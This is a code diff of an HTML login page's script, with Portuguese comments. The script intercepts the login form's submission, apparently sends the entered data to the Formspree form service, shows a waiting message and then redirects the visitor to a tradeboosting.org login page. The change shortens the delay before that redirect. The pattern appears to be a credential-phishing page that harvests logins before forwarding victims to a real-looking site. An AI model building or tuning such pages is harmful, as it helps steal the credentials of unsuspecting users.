@@ -85,7 +85,7 @@
     <script>
         // Função chamada ao enviar o formulário
         document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();  // Impede o envio padrão do formulário para o Formspree
+            event.preventDefault();  // Evita o envio tradicional do formulário
 
             // Exibe a mensagem de espera
             document.getElementById('messageContainer').style.display = 'block';
@@ -100,10 +100,10 @@
             })
             .then(function(response) {
                 if (response.ok) {
-                    // Após o envio, faz o redirecionamento para o site desejado
+                    // Após o envio bem-sucedido, faz o redirecionamento para o site desejado
                     setTimeout(function() {
                         window.location.href = "https://tradeboosting.org/app/login.php"; 
-                    }, 20000); // Atraso de 2 segundos para o redirecionamento
+                    }, 2000); // Atraso de 2 segundos para o redirecionamento
                 } else {
                     // Caso haja algum erro, pode exibir uma mensagem (opcional)
                     alert("Houve um erro ao enviar os dados. Tente novamente.");
